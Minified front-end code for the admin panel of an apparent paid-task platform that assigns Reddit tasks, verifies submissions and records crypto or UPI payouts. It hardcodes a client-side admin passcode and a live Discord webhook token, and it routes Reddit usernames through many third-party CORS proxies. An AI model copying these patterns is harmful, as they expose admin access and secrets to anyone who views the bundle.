hover:border-red-600 transition-all flex items-center justify-center gap-2",children:[s.jsx($s,{size:16}),"RESOLVE"]})]})]})},p.id)):s.jsxs("div",{className:"py-20 text-center bg-white/[0.01] border border-dashed border-white/10 rounded-[32px]",children:[s.jsx(rs,{size:48,className:"mx-auto text-gray-700 mb-4"}),s.jsx("p",{className:"text-gray-500 font-bold uppercase tracking-widest text-xs",children:"No active reports. Everything is smooth!"})]})})]}):w==="Withdrawals"?s.jsxs("section",{className:"space-y-6 animate-in fade-in slide-in-from-right-4 duration-500",children:[s.jsxs("div",{className:"flex items-center justify-between mb-8",children:[s.jsx("h2",{className:"text-xl font-bold italic uppercase tracking-tight",children:"Completed Withdrawals"}),s.jsxs("div",{className:"px-4 py-2 bg-white/[0.03] border border-white/5 rounded-2xl",children:[s.jsx("span",{className:"text-[10px] font-black text-gray-500 uppercase tracking-widest",children:"Total Paid: "}),s.jsx("span",{className:"text-sm font-black text-white",children:x.filter(p=>p.status==="completed").length})]})]}),s.jsx("div",{className:"space-y-3",children:x.filter(p=>p.status==="completed").length>0?x.filter(p=>p.status==="completed").map(p=>{const O=new Date(p.created_at).toLocaleDateString([],{month:"short",day:"numeric",year:"numeric"}),L=h.find(W=>W.email===p.user_email);return s.jsxs("div",{className:"bg-white/[0.02] border border-white/5 p-5 rounded-3xl flex flex-col sm:flex-row items-center justify-between gap-4 group hover:border-emerald-500/20 transition-all",children:[s.jsxs("div",{className:"flex items-center gap-4 flex-1",children:[s.jsx("div",{className:"w-10 h-10 bg-emerald-500/10 rounded-xl flex items-center justify-center border border-emerald-500/20 text-emerald-500",children:s.jsx(jt,{size:18,strokeWidth:3})}),s.jsxs("div",{children:[s.jsxs("div",{className:"flex items-center gap-2 mb-0.5",children:[s.jsx("span",{className:"text-[10px] font-mono text-gray-500",children:p.transaction_id}),s.jsx("h4",{className:"text-sm font-bold text-white",children:L?.server_username||p.user_email.split("@")[0]})]}),s.jsxs("div",{className:"flex items-center gap-3",children:[s.jsx("span",{className:"text-[11px] font-bold text-gray-400",children:p.user_email}),s.jsx("span",{className:"text-gray-700 text-[10px]",children:""}),s.jsxs("span",{className:"text-[10px] font-bold text-gray-500 uppercase tracking-tight",children:["Paid on ",O]})]})]})]}),s.jsxs("div",{className:"flex items-center gap-6",children:[s.jsxs("div",{className:"text-right",children:[s.jsx("span",{className:"block text-[9px] font-black text-gray-600 uppercase tracking-widest mb-0.5",children:"Amount Paid"}),s.jsxs("span",{className:"text-sm font-black text-emerald-500",children:["$",p.amount.toFixed(2)]})]}),s.jsxs("div",{className:"text-right min-w-[120px]",children:[s.jsx("span",{className:"block text-[9px] font-black text-gray-600 uppercase tracking-widest mb-0.5",children:"Method"}),s.jsxs("div",{className:"flex items-center justify-end gap-2",children:[s.jsx("img",{src:ll[p.payout_method.type],alt:"",className:"w-3.5 h-3.5 object-contain"}),s.jsx("span",{className:"text-[10px] font-bold text-gray-300",children:p.payout_method.label})]})]})]})]},p.id)}):s.jsxs("div",{className:"py-20 text-center bg-white/[0.01] border border-dashed border-white/10 rounded-[32px]",children:[s.jsx(Hn,{size:48,className:"mx-auto text-gray-700 mb-4"}),s.jsx("p",{className:"text-gray-500 font-bold uppercase tracking-widest text-xs",children:"No completed withdrawals yet."})]})})]}):s.jsxs("section",{className:"space-y-6 animate-in fade-in slide-in-from-right-4 duration-500",children:[s.jsxs("div",{className:"flex items-center justify-between mb-8",children:[s.jsx("h2",{className:"text-xl font-bold italic uppercase tracking-tight",children:"Total Submission History"}),s.jsxs("div",{className:"px-4 py-2 bg-white/[0.03] border border-white/5 rounded-2xl",children:[s.jsx("span",{className:"text-[10px] font-black text-gray-500 uppercase tracking-widest",children:"Total: "}),s.jsx("span",{className:"text-sm font-black text-white",children:c.filter(p=>p.status!=="available").length})]})]}),s.jsx("div",{className:"space-y-3",children:c.filter(p=>p.status!=="available").length>0?c.filter(p=>p.status!=="available").map(p=>{const O=p.created_at?new Date(p.created_at).toLocaleDateString([],{month:"short",day:"numeric",year:"numeric"}):"---",L=h.find(W=>W.email===p.claimed_by);return s.jsxs("div",{className:"bg-white/[0.02] border border-white/5 p-5 rounded-3xl flex flex-col sm:flex-row items-center justify-between gap-4 group hover:border-blue-500/20 transition-all",children:[s.jsxs("div",{className:"flex items-center gap-4 flex-1",children:[s.jsx("div",{className:"w-10 h-10 bg-white/[0.03] rounded-xl flex items-center justify-center border border-white/5 text-gray-500 group-hover:text-blue-500 transition-colors",children:s.jsx(ss,{size:18})}),s.jsxs("div",{children:[s.jsxs("div",{className:"flex items-center gap-2 mb-0.5",children:[s.jsx("span",{className:"text-[10px] font-black text-blue-500",children:p.task_id_display}),s.jsx("h4",{className:"text-sm font-bold text-white",children:p.title}),s.jsx("span",{className:`text-[8px] font-black px-1.5 py-0.5 rounded uppercase ${p.tier==="Tier 3"?"bg-red-500/10 text-red-500":p.tier==="Tier 2"?"bg-amber-500/10 text-amber-500":"bg-emerald-500/10 text-emerald-500"}`,children:p.tier})]}),s.jsxs("div",{className:"flex items-center gap-3",children:[s.jsxs("span",{className:"text-[11px] font-bold text-gray-400",children:[L?.server_username||p.claimed_by?.split("@")[0],s.jsxs("span",{className:"text-gray-600 font-medium ml-1",children:["(u/",L?.reddit_username||"not_linked",")"]})]}),s.jsx("span",{className:"text-gray-700 text-[10px]",children:""}),s.jsx("span",{className:"text-[10px] font-bold text-gray-500 uppercase tracking-tight",children:O})]})]})]}),s.jsxs("div",{className:"flex items-center gap-6",children:[s.jsxs("div",{className:"text-right",children:[s.jsx("span",{className:"block text-[9px] font-black text-gray-600 uppercase tracking-widest mb-0.5",children:"Reward"}),s.jsx("span",{className:"text-sm font-black text-emerald-500",children:p.reward})]}),s.jsxs("div",{className:"text-right min-w-[100px]",children:[s.jsx("span",{className:"block text-[9px] font-black text-gray-600 uppercase tracking-widest mb-0.5",children:"Status"}),s.jsxs("div",{className:"flex items-center justify-end gap-1.5",children:[s.jsx("div",{className:`w-1.5 h-1.5 rounded-full ${p.status==="verified"?"bg-emerald-500":p.status==="submitted"?"bg-amber-500 animate-pulse":p.status==="rejected"?"bg-red-500":"bg-blue-500"}`}),s.jsx("span",{className:`text-[10px] font-black uppercase tracking-widest ${p.status==="verified"?"text-emerald-500":p.status==="submitted"?"text-amber-500":p.status==="rejected"?"text-red-500":"text-blue-500"}`,children:p.status})]})]})]})]},p.id)}):s.jsxs("div",{className:"py-20 text-center bg-white/[0.01] border border-dashed border-white/10 rounded-[32px]",children:[s.jsx(at,{size:48,className:"mx-auto text-gray-700 mb-4"}),s.jsx("p",{className:"text-gray-500 font-bold uppercase tracking-widest text-xs",children:"No submissions recorded yet."})]})})]}),s.jsxs("section",{className:"mt-20 p-8 border border-dashed border-white/10 rounded-[32px] bg-white/[0.01]",children:[s.jsx("h2",{className:"text-sm font-bold text-gray-500 uppercase tracking-[0.2em] mb-4",children:"Security Notice"}),s.jsx("p",{className:"text-xs text-gray-600 leading-relaxed",children:"This admin panel is restricted to authorized personnel. All task distributions are logged with your IP address and timestamp. Ensure all target URLs comply with the network's safety guidelines before publishing."})]}),T&&s.jsx("div",{className:"fixed inset-0 z-[200] flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-300",children:s.jsxs("div",{className:"w-full max-w-lg bg-[#0a0a0a] border border-white/10 rounded-[40px] p-8 sm:p-12 shadow-2xl animate-in zoom-in duration-300",children:[s.jsxs("div",{className:"flex flex-col items-center text-center mb-8",children:[s.jsx("div",{className:"w-16 h-16 bg-blue-600/10 rounded-2xl flex items-center justify-center mb-6 border border-blue-500/20",children:s.jsx(Er,{className:"text-blue-500",size:32})}),s.jsx("h2",{className:"text-2xl font-black tracking-tight mb-2 uppercase italic",children:"Send Admin Alert"}),s.jsxs("p",{className:"text-gray-500 text-sm",children:["To: ",s.jsx("span",{className:"text-blue-400 font-bold",children:z})]})]}),s.jsxs("div",{className:"space-y-6",children:[s.jsxs("div",{className:"space-y-3",children:[s.jsx("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-widest ml-1",children:"Message Content"}),s.jsx("textarea",{rows:4,autoFocus:!0,placeholder:"Enter the alert or update details for the user...",value:H,onChange:p=>te(p.target.value),className:"w-full px-6 py-5 bg-white/[0.03] border border-white/5 rounded-3xl focus:outline-none focus:border-blue-500 transition-all text-sm placeholder:text-gray-600 resize-none shadow-inner"})]}),s.jsxs("div",{className:"flex gap-4",children:[s.jsx("button",{onClick:()=>D(!1),className:"flex-1 py-4 bg-white/[0.03] border border-white/10 text-gray-400 rounded-2xl font-bold text-sm hover:text-white hover:bg-white/5 transition-all",children:"Cancel"}),s.jsx("button",{onClick:Xn,disabled:!H.trim()||J,className:"flex-1 py-4 bg-blue-600 text-white rounded-2xl font-black text-sm hover:bg-blue-700 transition-all shadow-lg shadow-blue-600/20 flex items-center justify-center gap-2 group disabled:opacity-50 disabled:cursor-not-allowed",children:J?"Sending...":s.jsxs(s.Fragment,{children:["Send Alert",s.jsx(Vn,{size:18,className:"group-hover:translate-x-1 group-hover:-translate-y-1 transition-transform"})]})})]})]})]})}),ne&&Ee&&s.jsx("div",{className:"fixed inset-0 z-[200] flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-300",children:s.jsxs("div",{className:"w-full max-w-lg bg-[#0a0a0a] border border-white/10 rounded-[40px] p-8 sm:p-12 shadow-2xl animate-in zoom-in duration-300",children:[s.jsxs("div",{className:"flex flex-col items-center text-center mb-8",children:[s.jsx("div",{className:"w-16 h-16 bg-red-600/10 rounded-2xl flex items-center justify-center mb-6 border border-red-500/20",children:s.jsx(De,{className:"text-red-500",size:32})}),s.jsx("h2",{className:"text-2xl font-black tracking-tight mb-2 uppercase italic",children:"Reject Submission"}),s.jsxs("p",{className:"text-gray-500 text-sm",children:["Task: ",s.jsx("span",{className:"text-red-400 font-bold",children:Ee.title})]}),s.jsxs("p",{className:"text-gray-600 text-xs mt-1",children:["User: ",Ee.claimed_by]})]}),s.jsxs("div",{className:"space-y-6",children:[s.jsxs("div",{className:"space-y-3",children:[s.jsx("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-widest ml-1",children:"Rejection Reason"}),s.jsx("textarea",{rows:4,autoFocus:!0,placeholder:"Enter the reason for rejection...",value:Fe,onChange:p=>Re(p.target.value),className:"w-full px-6 py-5 bg-white/[0.03] border border-white/5 rounded-3xl focus:outline-none focus:border-red-500 transition-all text-sm placeholder:text-gray-600 resize-none shadow-inner"})]}),s.jsxs("div",{className:"flex gap-4",children:[s.jsx("button",{onClick:()=>{ue(!1),ze(null),Re("")},className:"flex-1 py-4 bg-white/[0.03] border border-white/10 text-gray-400 rounded-2xl font-bold text-sm hover:text-white hover:bg-white/5 transition-all",children:"Cancel"}),s.jsx("button",{onClick:Ms,disabled:!Fe.trim()||de,className:"flex-1 py-4 bg-red-600 text-white rounded-2xl font-black text-sm hover:bg-red-700 transition-all shadow-lg shadow-red-600/20 flex items-center justify-center gap-2 group disabled:opacity-50 disabled:cursor-not-allowed",children:de?"Rejecting...":s.jsxs(s.Fragment,{children:["Reject Task",s.jsx(De,{size:18,strokeWidth:3})]})})]})]})]})}),we&&U&&s.jsx("div",{className:"fixed inset-0 z-[200] flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-300",children:s.jsxs("div",{className:"w-full max-w-lg bg-[#0a0a0a] border border-white/10 rounded-[40px] p-8 sm:p-12 shadow-2xl animate-in zoom-in duration-300",children:[s.jsxs("div",{className:"flex flex-col items-center text-center mb-8",children:[s.jsx("div",{className:"w-16 h-16 bg-emerald-600/10 rounded-2xl flex items-center justify-center mb-6 border border-emerald-500/20",children:s.jsx(Os,{className:"text-emerald-500",size:32})}),s.jsx("h2",{className:"text-2xl font-black tracking-tight mb-2 uppercase italic",children:"Confirm Payout"}),s.jsxs("p",{className:"text-gray-500 text-sm",children:["Transaction ID: ",s.jsx("span",{className:"text-blue-400 font-mono font-bold",children:U.transaction_id})]}),s.jsxs("div",{className:"mt-4 p-4 bg-white/[0.02] border border-white/5 rounded-2xl w-full text-left",children:[s.jsxs("div",{className:"flex justify-between items-center mb-3",children:[s.jsx("span",{className:"text-xs font-bold text-gray-500 uppercase",children:"Amount to Pay"}),s.jsxs("span",{className:"text-xl font-black text-emerald-500",children:["$",U.amount.toFixed(2)]})]}),s.jsxs("div",{className:"space-y-2",children:[s.jsx("span",{className:"text-[10px] font-bold text-gray-600 uppercase tracking-widest block",children:"Recipient Details"}),s.jsxs("div",{className:"flex items-center gap-3 p-3 bg-black/40 rounded-xl border border-white/5",children:[s.jsx("img",{src:ll[U.payout_method.type],alt:"",className:"w-5 h-5 object-contain"}),s.jsxs("div",{className:"min-w-0",children:[s.jsx("p",{className:"text-[10px] font-black text-gray-400 uppercase leading-none mb-1",children:U.payout_method.label}),s.jsx("p",{className:"text-xs font-bold text-white truncate",children:U.payout_method.value})]})]})]})]})]}),s.jsxs("div",{className:"flex gap-4",children:[s.jsx("button",{onClick:()=>{he(!1),Z(null)},className:"flex-1 py-4 bg-white/[0.03] border border-white/10 text-gray-400 rounded-2xl font-bold text-sm hover:text-white hover:bg-white/5 transition-all",children:"Cancel"}),s.jsx("button",{onClick:Qn,disabled:ee,className:"flex-1 py-4 bg-emerald-600 text-white rounded-2xl font-black text-sm hover:bg-emerald-700 transition-all shadow-lg shadow-emerald-600/20 flex items-center justify-center gap-2 group disabled:opacity-50",children:ee?"Processing...":s.jsxs(s.Fragment,{children:["Confirm & Pay",s.jsx(jt,{size:18,strokeWidth:3})]})})]})]})})]})]}):s.jsxs(ns,{children:[s.jsx("div",{className:`fixed top-6 left-6 right-6 md:left-auto md:right-10 z-[100] pointer-events-none flex justify-center md:justify-end transition-all duration-300 transform ${Ue.show?"opacity-100 translate-y-0 scale-100":"opacity-0 -translate-y-4 scale-95"}`,children:s.jsxs("div",{className:`flex items-center justify-between gap-4 px-8 py-5 rounded-[24px] border backdrop-blur-2xl shadow-[0_20px_50px_rgba(0,0,0,0.3)] pointer-events-auto min-w-[280px] max-w-[90vw] md:max-w-md ${Ue.type==="success"?"bg-emerald-500/15 border-emerald-500/30 text-emerald-400":Ue.type==="error"?"bg-red-500/15 border-red-500/30 text-red-400":"bg-blue-500/15 border-blue-500/30 text-blue-400"}`,children:[s.jsxs("div",{className:"flex items-center gap-4",children:[s.jsx("div",{className:"flex-shrink-0",children:Ue.type==="success"?s.jsx(jt,{size:24,strokeWidth:3}):Ue.type==="error"?s.jsx(De,{size:24,strokeWidth:3}):s.jsx(at,{size:24,strokeWidth:3})}),s.jsx("span",{className:"font-bold text-base tracking-tight leading-tight",children:Ue.message})]}),s.jsx("button",{onClick:()=>Wt(p=>({...p,show:!1})),className:"flex-shrink-0 ml-2 p-1 hover:bg-white/10 rounded-full transition-colors",children:s.jsx(De,{size:18,strokeWidth:3})})]})}),s.jsx("div",{className:"min-h-[70vh] flex items-center justify-center p-4",children:s.jsxs("div",{className:"w-full max-w-md bg-white/[0.02] border border-white/5 rounded-[32px] p-8 sm:p-10 backdrop-blur-xl animate-in fade-in zoom-in duration-300",children:[s.jsxs("div",{className:"flex flex-col items-center text-center mb-8",children:[s.jsx("div",{className:"w-16 h-16 bg-blue-600/10 rounded-2xl flex items-center justify-center mb-6 border border-blue-500/20",children:s.jsx(Ds,{className:"text-blue-500",size:32})}),s.jsx("h1",{className:"text-2xl font-black tracking-tight mb-2",children:"Admin Access"}),s.jsx("p",{className:"text-gray-500 text-sm",children:"Enter the admin passcode to continue."})]}),s.jsxs("form",{onSubmit:Or,className:"space-y-6",children:[s.jsx("div",{className:"space-y-2",children:s.jsxs("div",{className:"relative group",children:[s.jsx(Nr,{className:"absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 group-focus-within:text-blue-500 transition-colors",size:20}),s.jsx("input",{type:"password",placeholder:"",value:a,onChange:p=>r(p.target.value),className:"w-full pl-12 pr-4 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-center tracking-[0.5em] font-mono text-lg"})]})}),s.jsx("button",{type:"submit",className:"w-full py-4 bg-blue-600 text-white rounded-2xl font-black text-sm hover:bg-blue-700 transition-all shadow-lg shadow-blue-600/20 active:scale-[0.98]",children:"ACCESS PANEL"})]})]})})]})},ol=new Map,sv=8640*60*1e3,cl={binance:"https://cryptologos.cc/logos/binance-coin-bnb-logo.png",usdt:"https://cryptologos.cc/logos/tether-usdt-logo.png",upi:"https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/UPI-Logo-vector.svg/1200px-UPI-Logo-vector.svg.png"},nv=()=>{const[a,r]=j.useState(""),[n,l]=j.useState(!1),[c,u]=j.useState([]),[h,m]=j.useState([]),[x,y]=j.useState([]),[v,k]=j.useState([]),[_,S]=j.useState(null),[w,E]=j.useState("Tasks"),[T,D]=j.useState(!1),[z,I]=j.useState(""),[H,te]=j.useState(""),[J,F]=j.useState(!1),[ne,ue]=j.useState(!1),[Ee,ze]=j.useState(null),[Fe,Re]=j.useState(""),[de,ae]=j.useState(!1),[we,he]=j.useState(!1),[U,Z]=j.useState(null),[ee,R]=j.useState(!1),[M,be]=j.useState(null),[je,Ce]=j.useState(""),[_e,Q]=j.useState("Tier 1"),[fe,xe]=j.useState(""),[B,Ae]=j.useState("COMMENT"),[et,ct]=j.useState(""),[Ne,kt]=j.useState(""),[dr,it]=j.useState(""),[ft,At]=j.useState(""),[st,_t]=j.useState("All"),[hr,Cr]=j.useState(!1),Tr=j.useRef(null),[Rr,Pr]=j.useState(!1),fr=j.useRef(null),[er,os]=j.useState(!1),Ft=j.useRef(null),[Oe,zs]=j.useState(new Date),[Ar,tr]=j.useState(!1),[Bt,Br]=j.useState(""),pr=j.useRef(null),[Ue,Wt]=j.useState({show:!1,message:"",type:"info"}),ge=(p,O="info")=>{Wt({show:!0,message:p,type:O}),setTimeout(()=>Wt(L=>({...L,show:!1})),2e3)},Or=p=>{p.preventDefault(),a==="SS@200"?(l(!0),ge("Access granted. Welcome Admin.","success")):ge("Invalid admin passcode.","error")},Ot=async()=>{const{data:p,error:O}=await X.from("withdrawal_requests").select("*").order("created_at",{ascending:!1});O?console.error("Error fetching withdrawal requests:",O):y(p||[])},rr=async()=>{const{data:p,error:O}=await X.from("admin_alerts").select("*").eq("user_email","ADMIN_REPORT").order("created_at",{ascending:!1});O?console.error("Error fetching reports:",O):k(p||[])},ln=async p=>{k(O=>O.filter(L=>L.id!==p));try{const{error:O}=await X.from("admin_alerts").delete().eq("id",p);O?(console.error("Delete error:",O),ge("Error: "+O.message,"error"),rr()):ge("Report resolved","success")}catch(O){console.error("Catch error:",O),rr()}};j.useEffect(()=>{if(n){pt(),Ir(),Ot(),rr();const O=setInterval(()=>{pt(),Ir(),Ot(),rr()},1e4);return()=>clearInterval(O)}const p=O=>{pr.current&&!pr.current.contains(O.target)&&tr(!1),Tr.current&&!Tr.current.contains(O.target)&&Cr(!1),fr.current&&!fr.current.contains(O.target)&&Pr(!1),Ft.current&&!Ft.current.contains(O.target)&&os(!1)};return document.addEventListener("mousedown",p),()=>document.removeEventListener("mousedown",p)},[n]);const pt=async()=>{const{data:p,error:O}=await X.from("tasks").select("*").order("created_at",{ascending:!1});O?console.error("Error fetching tasks:",O):u(p||[])},Ir=async(p=!1)=>{const{data:O,error:L}=await X.from("profiles").select("email, reddit_username, server_username, discord_username, balance, payout_methods, reddit_karma");L?console.error("Error fetching profiles:",L):O&&(m(O),O.forEach(W=>{W.reddit_username&&W.reddit_username!=="not_connected"&&(W.reddit_karma==null||p)&&on(W.email,W.reddit_username)}))},on=async(p,O)=>{try{const L=ol.get(O);if(L&&Date.now()-L.timestamp<sv){m(Le=>Le.map(Te=>Te.email===p?{...Te,reddit_karma:L.karma}:Te));return}const W=`https://www.reddit.com/user/${O}/about.json`,G=`https://old.reddit.com/user/${O}/about.json`,Tt=[`https://reddapi.p.rapidapi.com/api/user_info?username=${O}`,`https://api.redditmetrics.com/user/${O}`,`https://api.allorigins.win/raw?url=${encodeURIComponent(W)}`,`https://corsproxy.io/?${encodeURIComponent(W)}`,`https://proxy.cors.sh/${W}`,`https://cors-proxy.htmldriven.com/?url=${encodeURIComponent(W)}`,`https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(W)}`,`https://thingproxy.freeboard.io/fetch/${W}`,`https://yacdn.org/proxy/${W}`,`https://cors.bridged.cc/${W}`,`https://cors-proxy.fringe.zone/${W}`,G,W];for(const Le of Tt)try{const Te=new AbortController,Zn=setTimeout(()=>Te.abort(),5e3),Vr=await fetch(Le,{headers:{Accept:"application/json","x-rapidapi-host":"reddapi.p.rapidapi.com"},signal:Te.signal});if(clearTimeout(Zn),Vr.ok){const Ge=await Vr.json();if(Ge){if(Le.includes("reddapi.p.rapidapi.com")){if(Ge.data&&Ge.data.total_karma!==void 0){const Be=Ge.data.total_karma;ol.set(O,{karma:Be,timestamp:Date.now(),lastFetchedDate:new Date().toISOString().split("T")[0]}),m(Vt=>Vt.map(We=>We.email===p?{...We,reddit_karma:Be}:We)),await X.from("profiles").update({reddit_karma:Be}).eq("email",p);return}}else if(Le.includes("api.redditmetrics.com")){if(Ge.karma!==void 0){const Be=Ge.karma;ol.set(O,{karma:Be,timestamp:Date.now(),lastFetchedDate:new Date().toISOString().split("T")[0]}),m(Vt=>Vt.map(We=>We.email===p?{...We,reddit_karma:Be}:We)),await X.from("profiles").update({reddit_karma:Be}).eq("email",p);return}}else if(Ge.data){const Be=Ge.data.total_karma??(Ge.data.link_karma||0)+(Ge.data.comment_karma||0);ol.set(O,{karma:Be,timestamp:Date.now(),lastFetchedDate:new Date().toISOString().split("T")[0]}),m(Vt=>Vt.map(We=>We.email===p?{...We,reddit_karma:Be}:We)),await X.from("profiles").update({reddit_karma:Be}).eq("email",p);return}}}}catch{continue}}catch(L){console.error("Error fetching karma for",O,L)}},Us=async p=>{if(p.assigned_to!=="All")return;const O="https://discord.com/api/webhooks/1463922549120434186/4juUa6WRV4dCkAjfYv35DruT5VRS8AXT8TazwOCkbVGM1yBXnUP6hQHbdnjUqxGO9Dwp",L=`:rocket: NEW TASK ALERT

A new task has been published.
<@&1464974222559281210>
:link: Claim it here:
https://tasknet.site/dashboard`;try{await fetch(O,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:L})})}catch(W){console.error("Error sending Discord notification:",W)}},cn=async p=>{p.preventDefault();const L={task_id_display:_?c.find(W=>W.id===_)?.task_id_display:`#${Math.floor(1e5+Math.random()*9e5)}`,tier:_e,subreddit:fe,title:je,category:B,reward:et,deadline:Ne,reddit_url:dr,instructions:ft,assigned_to:st,is_hidden:!1};if(_){const{error:W}=await X.from("tasks").update(L).eq("id",_);W?ge("Error updating task: "+W.message,"error"):(ge("Task Updated Successfully!","success"),S(null))}else{const{error:W}=await X.from("tasks").insert([L]);W?ge("Error posting task: "+W.message,"error"):(ge("Task Posted Successfully!","success"),Us(L))}mr(),pt()},mr=()=>{Ce(""),Q("Tier 1"),xe(""),ct(""),kt(""),it(""),At(""),_t("All"),Ae("COMMENT"),S(null),Br("")},Ls=p=>{S(p.id),Ce(p.title),Q(p.tier||"Tier 1"),xe(p.subreddit||""),Ae(p.category),ct(p.reward),kt(p.deadline),it(p.reddit_url),At(p.instructions),_t(p.assigned_to),window.scrollTo({top:0,behavior:"smooth"})},Wr=async p=>{if(!window.confirm("Delete this task?"))return;const{error:O}=await X.from("tasks").delete().eq("id",p);O?ge("Error deleting task","error"):(ge("Task Deleted Successfully","success"),pt())},Jn=async p=>{const{error:O}=await X.from("tasks").update({is_hidden:!p.is_hidden}).eq("id",p.id);O?ge("Error updating status","error"):(ge(p.is_hidden?"Task Visible":"Task Hidden","info"),pt())},qr=async p=>{if(!p.claimed_by)return;const{error:O}=await X.from("tasks").update({status:"verified"}).eq("id",p.id);if(O){ge("Error verifying task: "+O.message,"error");return}const{data:L}=await X.from("profiles").select("balance").eq("email",p.claimed_by).single(),W=parseFloat(L?.balance||"0"),G=parseFloat(p.reward.replace("$","")),Tt=W+G,{error:Le}=await X.from("profiles").update({balance:Tt}).eq("email",p.claimed_by);Le?ge("Error updating balance: "+Le.message,"error"):(ge("Task verified and reward added to wallet!","success"),pt())},$r=async p=>{I(p),te(""),D(!0)},cs=p=>{ze(p),Re(""),ue(!0)},Ms=async()=>{if(!Ee||!Fe.trim())return;ae(!0);const{error:p}=await X.from("tasks").update({status:"rejected"}).eq("id",Ee.id);if(p){ge("Error rejecting task: "+p.message,"error"),ae(!1);return}const{error:O}=await X.from("admin_alerts").insert([{user_email:Ee.claimed_by,message:`Your submission for task "${Ee.title}" (${Ee.task_id_display}) has been rejected.

Reason: ${Fe}`}]);O?ge("Task rejected but failed to notify user: "+O.message,"error"):ge("Task rejected and user notified!","success"),ue(!1),ze(null),Re(""),ae(!1),pt()},Yn=p=>{Z(p),he(!0)},Qn=async()=>{if(!U)return;R(!0);const{error:p}=await X.from("withdrawal_requests").update({status:"completed"}).eq("id",U.id);p?ge("Error updating withdrawal: "+p.message,"error"):(ge("Withdrawal marked as completed!","success"),Ot(),he(!1),Z(null)),R(!1)},Xn=async()=>{if(!H.trim())return;F(!0);const{error:p}=await X.from("admin_alerts").insert([{user_email:z,message:H}]);p?ge("Error sending alert: "+p.message,"error"):(ge("Alert sent to user!","success"),D(!1)),F(!1)},qt=h.filter(p=>p.email.toLowerCase().includes(Bt.toLowerCase())||p.reddit_username&&p.reddit_username.toLowerCase().includes(Bt.toLowerCase())),us=h.find(p=>p.email===st),un=st==="All"?"Everyone (Public)":`${us?.server_username||st.split("@")[0]}[${us?.reddit_username||"No Reddit"}]`;return n?s.jsxs(ns,{children:[s.jsx("div",{className:`fixed top-6 left-6 right-6 md:left-auto md:right-10 z-[100] pointer-events-none flex justify-center md:justify-end transition-all duration-300 transform ${Ue.show?"opacity-100 translate-y-0 scale-100":"opacity-0 -translate-y-4 scale-95"}`,children:s.jsxs("div",{className:`flex items-center justify-between gap-4 px-8 py-5 rounded-[24px] border backdrop-blur-2xl shadow-[0_20px_50px_rgba(0,0,0,0.3)] pointer-events-auto min-w-[280px] max-w-[90vw] md:max-w-md ${Ue.type==="success"?"bg-emerald-500/15 border-emerald-500/30 text-emerald-400":Ue.type==="error"?"bg-red-500/15 border-red-500/30 text-red-400":"bg-blue-500/15 border-blue-500/30 text-blue-400"}`,children:[s.jsxs("div",{className:"flex items-center gap-4",children:[s.jsx("div",{className:"flex-shrink-0",children:Ue.type==="success"?s.jsx(jt,{size:24,strokeWidth:3}):Ue.type==="error"?s.jsx(De,{size:24,strokeWidth:3}):s.jsx(at,{size:24,strokeWidth:3})}),s.jsx("span",{className:"font-bold text-base tracking-tight leading-tight",children:Ue.message})]}),s.jsx("button",{onClick:()=>Wt(p=>({...p,show:!1})),className:"flex-shrink-0 ml-2 p-1 hover:bg-white/10 rounded-full transition-colors",children:s.jsx(De,{size:18,strokeWidth:3})})]})}),s.jsxs("div",{className:"max-w-4xl mx-auto animate-in fade-in slide-in-from-bottom-4 duration-500",children:[s.jsxs("header",{className:"mb-8 sm:mb-10",children:[s.jsx("div",{className:"flex items-center gap-3 mb-2",children:s.jsx("div",{className:"px-3 py-1 bg-blue-600/10 text-blue-500 rounded-full text-[10px] font-bold uppercase tracking-widest border border-blue-500/20",children:"Admin Control"})}),s.jsx("h1",{className:"text-2xl sm:text-3xl font-black tracking-tighter uppercase italic",children:w==="Tasks"?"Task Management":w==="Users"?"User Management":w==="Withdrawals"?"Payout Records":w==="Reports"?"Task Reports":"Submission Verifications"}),s.jsx("p",{className:"text-xs sm:text-sm text-gray-500 mt-1",children:w==="Tasks"?"Distribute new tasks to the network.":w==="Users"?"View all registered users and their details.":w==="Withdrawals"?"View historical payout data and completed transactions.":w==="Reports"?"Review problems reported by users.":"Review and approve user submissions."})]}),s.jsxs("div",{className:"flex flex-wrap bg-white/[0.03] border border-white/5 p-1 rounded-2xl mb-8 sm:mb-12 w-full sm:w-fit gap-1",children:[s.jsx("button",{onClick:()=>E("Tasks"),className:`flex-1 sm:flex-none px-4 sm:px-8 py-2.5 rounded-xl text-[10px] md:text-xs font-black uppercase tracking-widest transition-all ${w==="Tasks"?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-500 hover:text-white"}`,children:"Create"}),s.jsxs("button",{onClick:()=>E("Verification"),className:`flex-1 sm:flex-none px-4 sm:px-8 py-2.5 rounded-xl text-[10px] md:text-xs font-black uppercase tracking-widest transition-all relative ${w==="Verification"?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-500 hover:text-white"}`,children:["Verify",c.filter(p=>p.status==="submitted").length>0&&s.jsx("span",{className:"absolute -top-1 -right-1 w-4 h-4 bg-red-500 rounded-full text-[8px] flex items-center justify-center animate-pulse",children:c.filter(p=>p.status==="submitted").length})]}),s.jsx("button",{onClick:()=>E("Submissions"),className:`flex-1 sm:flex-none px-4 sm:px-8 py-2.5 rounded-xl text-[10px] md:text-xs font-black uppercase tracking-widest transition-all ${w==="Submissions"?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-500 hover:text-white"}`,children:"History"}),s.jsx("button",{onClick:()=>E("Users"),className:`flex-1 sm:flex-none px-4 sm:px-8 py-2.5 rounded-xl text-[10px] md:text-xs font-black uppercase tracking-widest transition-all ${w==="Users"?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-500 hover:text-white"}`,children:"Users"}),s.jsx("button",{onClick:()=>E("Withdrawals"),className:`flex-1 sm:flex-none px-4 sm:px-8 py-2.5 rounded-xl text-[10px] md:text-xs font-black uppercase tracking-widest transition-all ${w==="Withdrawals"?"bg-blue-600 text-white shadow-lg 